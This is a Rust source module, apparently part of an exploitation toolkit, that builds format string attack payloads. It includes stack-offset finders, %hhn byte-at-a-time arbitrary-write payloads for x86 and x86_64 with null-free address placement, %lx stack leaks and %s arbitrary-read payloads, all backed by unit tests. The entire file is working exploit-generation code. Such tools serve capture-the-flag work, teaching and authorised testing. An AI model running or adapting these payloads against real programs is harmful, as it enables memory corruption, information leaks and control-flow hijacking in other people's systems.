//! Format string exploit helper.
//!
//! Generates payloads for printf-family format string vulnerabilities.
//! Supports %hhn byte-at-a-time write primitives and stack leak payloads.

use crate::error::{Error, Result};

/// Architecture for format string exploitation.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FmtArch {
    /// x86 (32-bit): all arguments on stack.
    X86,
    /// x86_64 (64-bit): first 5 printf args in registers, then stack.
    X86_64,
}

/// Configuration for format string payload generation.
#[derive(Debug, Clone)]
pub struct FmtStrConfig {
    /// Target architecture.
    pub arch: FmtArch,
    /// Stack offset where user input appears (in "words" / %p positions).
    pub offset: usize,
    /// Whether to avoid null bytes in the payload.
    pub null_byte_free: bool,
    /// Word size in bytes (4 for x86, 8 for x86_64).
    pub word_size: usize,
}

impl FmtStrConfig {
    /// Create a config for x86_64 with the given stack offset.
    pub fn x86_64(offset: usize) -> Self {
        Self {
            arch: FmtArch::X86_64,
            offset,
            null_byte_free: true,
            word_size: 8,
        }
    }

    /// Create a config for x86 with the given stack offset.
    pub fn x86(offset: usize) -> Self {
        Self {
            arch: FmtArch::X86,
            offset,
            null_byte_free: false,
            word_size: 4,
        }
    }
}

/// A single format string write primitive.
#[derive(Debug, Clone)]
pub struct FmtWrite {
    /// Target address to write to.
    pub address: u64,
    /// Value to write.
    pub value: u64,
    /// Number of bytes to write (1..=8).
    pub num_bytes: usize,
}

/// Generate an offset finder payload.
///
/// Produces a string like `"AAAAAAAA.%1$p.%2$p.%3$p..."` that helps
/// determine where user input appears on the stack.
pub fn generate_offset_finder(marker: &str, num_positions: usize) -> String {
    let mut payload = String::from(marker);
    for i in 1..=num_positions {
        payload.push_str(&format!(".%{}$p", i));
    }
    payload
}

/// Parse the output of an offset finder to determine the stack offset.
///
/// Looks for the hex representation of `marker` bytes in the `.`-delimited output.
pub fn find_offset(marker: &[u8], output: &str) -> Option<usize> {
    let marker_hex = if marker.len() >= 8 {
        let val = u64::from_le_bytes(marker[..8].try_into().ok()?);
        format!("0x{:x}", val)
    } else if marker.len() >= 4 {
        let val = u32::from_le_bytes(marker[..4].try_into().ok()?);
        format!("0x{:x}", val)
    } else {
        return None;
    };

    for (i, field) in output.split('.').enumerate() {
        if field.trim() == marker_hex {
            return Some(i);
        }
    }
    None
}

/// Calculate padding so that `(current_written + padding) % 256 == target_byte`.
pub fn calculate_padding(current_written: usize, target_byte: u8) -> usize {
    let target = target_byte as usize;
    let current = current_written % 256;
    if target >= current {
        target - current
    } else {
        256 + target - current
    }
}

/// Generate a format string payload using byte-at-a-time %hhn writes.
///
/// For x86_64 with null-byte-free mode, addresses are placed at the
/// end of the payload since user-space addresses contain null bytes.
pub fn write_payload(config: &FmtStrConfig, writes: &[FmtWrite]) -> Result<Vec<u8>> {
    if writes.is_empty() {
        return Ok(Vec::new());
    }

    // Collect all (address, byte_value) pairs
    let mut byte_writes: Vec<(u64, u8)> = Vec::new();
    for w in writes {
        for i in 0..w.num_bytes.min(8) {
            let byte_val = ((w.value >> (i * 8)) & 0xFF) as u8;
            byte_writes.push((w.address + i as u64, byte_val));
        }
    }

    // Sort by target byte value to minimize total padding
    byte_writes.sort_by_key(|&(_, b)| b);

    if config.null_byte_free {
        generate_null_free_payload(config, &byte_writes)
    } else {
        generate_standard_payload(config, &byte_writes)
    }
}

/// Standard payload: addresses first, then format specifiers (for x86).
fn generate_standard_payload(
    config: &FmtStrConfig,
    byte_writes: &[(u64, u8)],
) -> Result<Vec<u8>> {
    let num_writes = byte_writes.len();
    let mut payload = Vec::new();

    for (addr, _) in byte_writes {
        match config.word_size {
            4 => payload.extend_from_slice(&(*addr as u32).to_le_bytes()),
            8 => payload.extend_from_slice(&addr.to_le_bytes()),
            _ => return Err(Error::Other("unsupported word size".into())),
        }
    }

    let addr_total_bytes = num_writes * config.word_size;
    let mut written = addr_total_bytes;
    let mut fmt_part = String::new();

    for (i, &(_, target_byte)) in byte_writes.iter().enumerate() {
        let padding = calculate_padding(written, target_byte);
        let param_offset = config.offset + i;

        if padding > 0 {
            fmt_part.push_str(&format!("%{}c", padding));
            written += padding;
        }
        fmt_part.push_str(&format!("%{}$hhn", param_offset));
    }

    payload.extend_from_slice(fmt_part.as_bytes());
    Ok(payload)
}

/// Null-free payload: format specifiers first, addresses at end (for x86_64).
fn generate_null_free_payload(
    config: &FmtStrConfig,
    byte_writes: &[(u64, u8)],
) -> Result<Vec<u8>> {
    let num_writes = byte_writes.len();

    // Two-pass approach: estimate format string length, then generate
    // with correct parameter offsets.
    let estimated_fmt_len = num_writes * 20;
    let fmt_words = (estimated_fmt_len + config.word_size - 1) / config.word_size;

    let build_fmt = |addr_word_offset: usize| -> (String, usize) {
        let mut fmt = String::new();
        let mut written = 0usize;
        for (i, &(_, target_byte)) in byte_writes.iter().enumerate() {
            let padding = calculate_padding(written, target_byte);
            let param_offset = config.offset + addr_word_offset + i;
            if padding > 0 {
                fmt.push_str(&format!("%{}c", padding));
                written += padding;
            }
            fmt.push_str(&format!("%{}$hhn", param_offset));
        }
        (fmt, written)
    };

    // First pass
    let (fmt1, _) = build_fmt(fmt_words);
    let mut payload = fmt1.into_bytes();
    while payload.len() % config.word_size != 0 {
        payload.push(b'X');
    }

    // Recalculate with actual word count
    let actual_words = payload.len() / config.word_size;
    if actual_words != fmt_words {
        let (fmt2, _) = build_fmt(actual_words);
        payload = fmt2.into_bytes();
        while payload.len() % config.word_size != 0 {
            payload.push(b'X');
        }
    }

    // Append addresses at the end
    for (addr, _) in byte_writes {
        payload.extend_from_slice(&addr.to_le_bytes());
    }

    Ok(payload)
}

/// Generate a payload to leak stack values at given offsets.
///
/// Returns a format string like `"%6$lx.%7$lx.%8$lx"`.
pub fn leak_payload(offsets: &[usize]) -> String {
    offsets
        .iter()
        .map(|o| format!("%{}$lx", o))
        .collect::<Vec<_>>()
        .join(".")
}

/// Generate a payload to leak a string at a target address via `%s`.
pub fn leak_string_payload(config: &FmtStrConfig, target_address: u64) -> Vec<u8> {
    if config.null_byte_free {
        let fmt = format!("%{}$s", config.offset + 1);
        let mut payload = fmt.into_bytes();
        while payload.len() % config.word_size != 0 {
            payload.push(b'X');
        }
        payload.extend_from_slice(&target_address.to_le_bytes());
        payload
    } else {
        let mut payload = match config.word_size {
            4 => (target_address as u32).to_le_bytes().to_vec(),
            _ => target_address.to_le_bytes().to_vec(),
        };
        let fmt = format!("%{}$s", config.offset);
        payload.extend_from_slice(fmt.as_bytes());
        payload
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn padding_basic() {
        assert_eq!(calculate_padding(0, 0x41), 0x41);
        assert_eq!(calculate_padding(0x41, 0x41), 0);
        assert_eq!(calculate_padding(0x42, 0x41), 255);
        assert_eq!(calculate_padding(0, 0), 0);
        assert_eq!(calculate_padding(255, 0), 1);
    }

    #[test]
    fn padding_wrap() {
        assert_eq!(calculate_padding(0x100, 0x01), 1);
        assert_eq!(calculate_padding(0xFF, 0xFE), 255);
    }

    #[test]
    fn offset_finder_format() {
        let payload = generate_offset_finder("AAAAAAAA", 5);
        assert!(payload.starts_with("AAAAAAAA"));
        assert!(payload.contains(".%1$p"));
        assert!(payload.contains(".%5$p"));
        assert!(!payload.contains(".%6$p"));
    }

    #[test]
    fn find_offset_found() {
        let marker = b"AAAAAAAA";
        let marker_val = u64::from_le_bytes(*marker);
        let output = format!("AAAAAAAA.0x1.0x2.0x3.0x4.0x5.0x{:x}.0x7", marker_val);
        assert_eq!(find_offset(marker, &output), Some(6));
    }

    #[test]
    fn find_offset_not_found() {
        let marker = b"AAAAAAAA";
        let output = "AAAAAAAA.0x1.0x2.0x3";
        assert_eq!(find_offset(marker, &output), None);
    }

    #[test]
    fn leak_payload_format() {
        assert_eq!(leak_payload(&[6, 7, 8]), "%6$lx.%7$lx.%8$lx");
    }

    #[test]
    fn standard_write() {
        let config = FmtStrConfig::x86(10);
        let writes = vec![FmtWrite { address: 0x08041234, value: 0x42, num_bytes: 1 }];
        let payload = write_payload(&config, &writes).unwrap();
        assert!(!payload.is_empty());
        // Address appears at the start (little-endian)
        assert_eq!(payload[0], 0x34);
        assert_eq!(payload[1], 0x12);
        let fmt_part = String::from_utf8_lossy(&payload[4..]);
        assert!(fmt_part.contains("$hhn"));
    }

    #[test]
    fn null_free_write() {
        let config = FmtStrConfig::x86_64(6);
        let writes = vec![FmtWrite { address: 0x00601020, value: 0x41, num_bytes: 1 }];
        let payload = write_payload(&config, &writes).unwrap();
        // Address should be at the END in null-free mode
        let addr_bytes = &payload[payload.len() - 8..];
        assert_eq!(u64::from_le_bytes(addr_bytes.try_into().unwrap()), 0x00601020);
        let fmt_part = String::from_utf8_lossy(&payload[..payload.len() - 8]);
        assert!(fmt_part.contains("$hhn"));
    }

    #[test]
    fn multi_byte_write() {
        let config = FmtStrConfig::x86_64(6);
        let writes = vec![FmtWrite { address: 0x00601020, value: 0x4142, num_bytes: 2 }];
        let payload = write_payload(&config, &writes).unwrap();
        // Should have 2 addresses (8 bytes each) at the end
        assert!(payload.len() >= 16);
        let addr_area = &payload[payload.len() - 16..];
        let addr1 = u64::from_le_bytes(addr_area[0..8].try_into().unwrap());
        let addr2 = u64::from_le_bytes(addr_area[8..16].try_into().unwrap());
        let addrs: Vec<u64> = vec![addr1, addr2];
        assert!(addrs.contains(&0x601020));
        assert!(addrs.contains(&0x601021));
    }

    #[test]
    fn empty_writes() {
        let config = FmtStrConfig::x86_64(6);
        assert!(write_payload(&config, &[]).unwrap().is_empty());
    }

    #[test]
    fn leak_string_null_free() {
        let config = FmtStrConfig::x86_64(6);
        let payload = leak_string_payload(&config, 0x601000);
        let addr_bytes = &payload[payload.len() - 8..];
        assert_eq!(u64::from_le_bytes(addr_bytes.try_into().unwrap()), 0x601000);
        let fmt_part = String::from_utf8_lossy(&payload[..payload.len() - 8]);
        assert!(fmt_part.contains("$s"));
    }
}
